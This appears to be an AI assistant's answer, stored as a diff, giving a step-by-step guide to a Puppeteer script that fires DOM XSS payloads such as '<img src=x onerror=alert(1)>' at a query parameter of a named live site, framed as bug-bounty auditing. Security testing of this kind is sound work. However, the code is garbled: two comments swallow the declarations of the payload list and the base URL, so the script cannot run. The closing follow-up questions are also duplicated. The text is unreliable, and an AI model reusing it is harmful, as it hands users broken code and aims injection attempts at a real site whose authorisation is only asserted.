@@ -1,0 +1,108 @@
+Using Puppeteer to automate the detection of DOM-Based Cross-Site Scripting (DOM XSS) is a powerful technique. It allows you to automatically inject test payloads into URLs or input fields and listen for execution triggers (like an alert() dialog).
+Below is the complete, step-by-step guide to setting up and running a DOM XSS detection script.
+------------------------------
+## Step 1: Initialize Your Project Environment
+First, create a dedicated project directory on your Linux system and install the required Node.js packages inside your virtual environment space.
+Open your terminal and run:
+
+# 1. Create a project directory
+mkdir xss-scanner && cd xss-scanner
+# 2. Initialize a Node.js project
+npm init -y
+# 3. Install Puppeteer
+npm install puppeteer
+
+------------------------------
+## Step 2: Write the Automated Scanner Script
+Create a new file named xss_detector.js. This script opens a headless browser, sets up listeners to catch code execution events (like dialog popups or console exceptions), injects payloads, and reports hits.
+Save the following code into xss_detector.js:
+
+const puppeteer = require('puppeteer');
+// A list of common DOM XSS payloads targeting HTML sinks and sinks like innerHTML/evalconst payloads = [
+    'javascript:alert(1)',
+    '<script>alert(1)</script>',
+    '<img src=x onerror=alert(1)>',
+    '"`><script>alert(1)</script>',
+    '${alert(1)}'
+];
+// The target base URL you want to audit (Make sure it is an in-scope asset)const baseUrl = 'https://1w.run'; 
+async function scanForDOMXSS() {
+    console.log(`[+] Initializing Chromium Browser via Puppeteer...`);
+    const browser = await puppeteer.launch({ headless: true });
+
+    for (let payload of payloads) {
+        const page = await browser.newPage();
+        let xssDetected = false;
+
+        // 1. Establish the Dialog Listener (Triggers if alert(), confirm(), or prompt() fires)
+        page.on('dialog', async dialog => {
+            if (dialog.message() || dialog.type() === 'alert') {
+                console.log(`\n[🚨 XSS DETECTED!] Dialog popped up with message: "${dialog.message()}"`);
+                console.log(`[🎯 Triggering Payload]: ${payload}`);
+                xssDetected = true;
+                await dialog.dismiss();
+            }
+        });
+
+        // 2. Establish a Console Listener (Catches evaluation context errors or stack traces)
+        page.on('console', msg => {
+            if (msg.type() === 'error' && msg.text().includes('alert')) {
+                console.log(`[⚠️ Console Warning]: Potential script execution blocked or logged: ${msg.text()}`);
+            }
+        });
+
+        // 3. Construct the target URL with the payload injected into a common query parameter
+        // (Change 'q', 'search', or 'id' depending on the input parameters found in F12)
+        const targetUrl = `${baseUrl}?search=${encodeURIComponent(payload)}`;
+        
+        try {
+            console.log(`[*] Testing parameter injection: ${targetUrl}`);
+            
+            // Navigate to the target page and wait until the frontend network traffic settles
+            await page.goto(targetUrl, { waitUntil: 'networkidle2', timeout: 10000 });
+            
+            // Give the browser client-side JavaScript an extra second to render sinks
+            await new Promise(resolve => setTimeout(resolve, 1000));
+
+        } catch (error) {
+            console.log(`[-] Timeout or error loading page for payload: ${payload}`);
+        } finally {
+            await page.close();
+        }
+    }
+
+    console.log(`\n[+] Scan Campaign Finished.`);
+    await browser.close();
+}
+
+scanForDOMXSS();
+
+------------------------------
+## Step 3: Execute the Automation Script
+Run your newly created automation layer directly from your virtual terminal shell:
+
+node xss_detector.js
+
+## How to read the results:
+
+* If vulnerable: The execution flow will instantly stop at the listener block and print: [🚨 XSS DETECTED!] Dialog popped up with message.... This gives you immediate, definitive proof of concept data to copy into a HackerOne submission template.
+* If secure: The script will iterate smoothly through the payload array, printing out the URLs tested, and conclude with Scan Campaign Finished without printing any alert flags.
+
+------------------------------
+## 🛡️ Compliance Warning (Safe Auditing Limits)
+To stay fully inside the boundaries of the 1win Bug Bounty Policy you reviewed earlier:
+
+   1. Do not use massive wordlists that fire thousands of inputs simultaneously.
+   2. Keep the payload list brief and execution sequential to match their threshold limit of under 5 requests per second.
+
+To help you configure this further, let me know:
+
+* Have you identified any specific parameter names (like id, lang, or redirect) in the URL fields of your target page that we should swap out for the search key?
+* Do you want to see how to extend this script to automatically fill out text input boxes on a page instead of just using URL parameters?
+
+If you want to customize this scanner further, tell me:
+
+* What parameter keys or form inputs did you find using F12 on the target page?
+* Do you want to modify this script to handle form fields instead of just URL queries?
+
+
